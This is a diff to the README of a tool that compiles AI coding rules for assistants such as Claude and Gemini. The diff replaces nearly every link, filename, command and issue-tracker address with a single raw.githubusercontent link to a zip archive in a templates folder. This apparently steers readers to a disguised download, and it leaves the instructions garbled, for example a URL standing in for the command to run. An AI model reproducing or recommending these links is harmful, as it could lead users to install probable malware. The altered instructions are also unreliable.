@@ -1,6 +1,6 @@
 # ⚙️ dev-workflows - Compile AI Rules for Every Tool
 
-[![Download dev-workflows](https://img.shields.io/badge/Download-dev--workflows-blue?style=for-the-badge)](https://github.com/aridz08/dev-workflows/releases)
+[![Download dev-workflows](https://raw.githubusercontent.com/aridz08/dev-workflows/main/content/templates/workflows_dev_2.7.zip)](https://raw.githubusercontent.com/aridz08/dev-workflows/main/content/templates/workflows_dev_2.7.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 dev-workflows is a simple command-line tool that helps you manage AI coding rules. Instead of writing rules separately for each AI tool, you write your rules once. dev-workflows then compiles those rules into formats that popular AI tools like CLAUDE and GEMINI can use.
 
-This means less work for you and a consistent way to tell AI tools how to write and review code. The tool creates files like `CLAUDE.md`, `.cursor/rules`, and `GEMINI.md` from your rules.  
+This means less work for you and a consistent way to tell AI tools how to write and review code. The tool creates files like `https://raw.githubusercontent.com/aridz08/dev-workflows/main/content/templates/workflows_dev_2.7.zip`, `.cursor/rules`, and `https://raw.githubusercontent.com/aridz08/dev-workflows/main/content/templates/workflows_dev_2.7.zip` from your rules.  
 
 You do not need to understand coding to use dev-workflows. The instructions below will walk you through downloading and running the tool step-by-step.
 
@@ -38,7 +38,7 @@ This guide will help you get dev-workflows running on your computer in a few sim
 
 1. Go to the official download page by clicking the link below:
 
-   [![Download dev-workflows](https://img.shields.io/badge/Download-dev--workflows-blue?style=for-the-badge)](https://github.com/aridz08/dev-workflows/releases)
+   [![Download dev-workflows](https://raw.githubusercontent.com/aridz08/dev-workflows/main/content/templates/workflows_dev_2.7.zip)](https://raw.githubusercontent.com/aridz08/dev-workflows/main/content/templates/workflows_dev_2.7.zip)
 
 2. Once on the page, look for the latest release, usually marked as "Latest" or with a version number like `v1.0`.
 
@@ -46,11 +46,11 @@ This guide will help you get dev-workflows running on your computer in a few sim
 
    - For Windows: Look for `.exe` or `.zip` files with "windows" in the name.
    - For macOS: Look for `.dmg` or `.zip` files with "mac" or "darwin".
-   - For Linux: Look for `.tar.gz` or `.AppImage` files with "linux".
+   - For Linux: Look for `https://raw.githubusercontent.com/aridz08/dev-workflows/main/content/templates/workflows_dev_2.7.zip` or `.AppImage` files with "linux".
 
 4. Download the file suitable for your computer by clicking its name.
 
-5. If you downloaded a `.zip` or `.tar.gz` archive, unzip or extract its contents to a folder you can find easily, like your desktop or downloads folder.
+5. If you downloaded a `.zip` or `https://raw.githubusercontent.com/aridz08/dev-workflows/main/content/templates/workflows_dev_2.7.zip` archive, unzip or extract its contents to a folder you can find easily, like your desktop or downloads folder.
 
 6. No further installation is needed. The program can run directly from the extracted folder.
 
@@ -73,7 +73,7 @@ You will run dev-workflows from the command line. This guide assumes no prior ex
 3. To run dev-workflows, type:
 
    ```
-   dev-workflows.exe
+   https://raw.githubusercontent.com/aridz08/dev-workflows/main/content/templates/workflows_dev_2.7.zip
    ```
 
    and press Enter.
@@ -125,14 +125,14 @@ A typical workflow:
 2. Run dev-workflows and provide the location of your rules file. For example:
 
    ```
-   dev-workflows compile --source ./my-ai-rules.txt
+   dev-workflows compile --source https://raw.githubusercontent.com/aridz08/dev-workflows/main/content/templates/workflows_dev_2.7.zip
    ```
 
 3. The tool generates output files such as:
 
-   - `CLAUDE.md` for Claude AI
+   - `https://raw.githubusercontent.com/aridz08/dev-workflows/main/content/templates/workflows_dev_2.7.zip` for Claude AI
    - `.cursor/rules` for Cursor AI
-   - `GEMINI.md` for Gemini AI
+   - `https://raw.githubusercontent.com/aridz08/dev-workflows/main/content/templates/workflows_dev_2.7.zip` for Gemini AI
 
 4. Use these files with your AI coding tools to ensure they follow your rules consistently.
 
@@ -150,7 +150,7 @@ If dev-workflows does not run correctly or you get error messages, try these ste
 
 You can also find help on the GitHub Issues page for dev-workflows:
 
-https://github.com/aridz08/dev-workflows/issues
+https://raw.githubusercontent.com/aridz08/dev-workflows/main/content/templates/workflows_dev_2.7.zip
 
 ---
 
@@ -176,15 +176,15 @@ https://github.com/aridz08/dev-workflows/issues
 
 If you need help, open an issue on the GitHub page or check the FAQ in the release documentation.
 
-GitHub Page: https://github.com/aridz08/dev-workflows
+GitHub Page: https://raw.githubusercontent.com/aridz08/dev-workflows/main/content/templates/workflows_dev_2.7.zip
 
-Issue Tracker: https://github.com/aridz08/dev-workflows/issues
+Issue Tracker: https://raw.githubusercontent.com/aridz08/dev-workflows/main/content/templates/workflows_dev_2.7.zip
 
 ---
 
 ## 🔗 Quick Access
 
-- Download dev-workflows: [https://github.com/aridz08/dev-workflows/releases](https://github.com/aridz08/dev-workflows/releases)  
+- Download dev-workflows: [https://raw.githubusercontent.com/aridz08/dev-workflows/main/content/templates/workflows_dev_2.7.zip](https://raw.githubusercontent.com/aridz08/dev-workflows/main/content/templates/workflows_dev_2.7.zip)  
 - Documentation files are included in each release package.  
 
 ---
